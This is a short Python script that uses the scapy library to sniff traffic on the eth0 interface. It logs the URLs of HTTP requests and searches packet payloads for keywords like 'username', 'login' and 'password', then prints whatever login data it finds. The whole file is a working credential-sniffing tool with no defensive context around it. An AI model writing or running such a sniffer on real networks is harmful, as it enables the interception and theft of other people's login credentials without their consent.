#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http #you need to pip install scapy_http 

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username","user","name","login","password","pass"]
        for keyword in keywords:
            if keyword in load:
                return load
    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest): #this is because scapy does 
                                          #not have http filter!
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


    if packet.haslayer(scapy.DNSRR): #this is because scapy does 
        print("[+] DNS response detected " )

sniff("eth0")
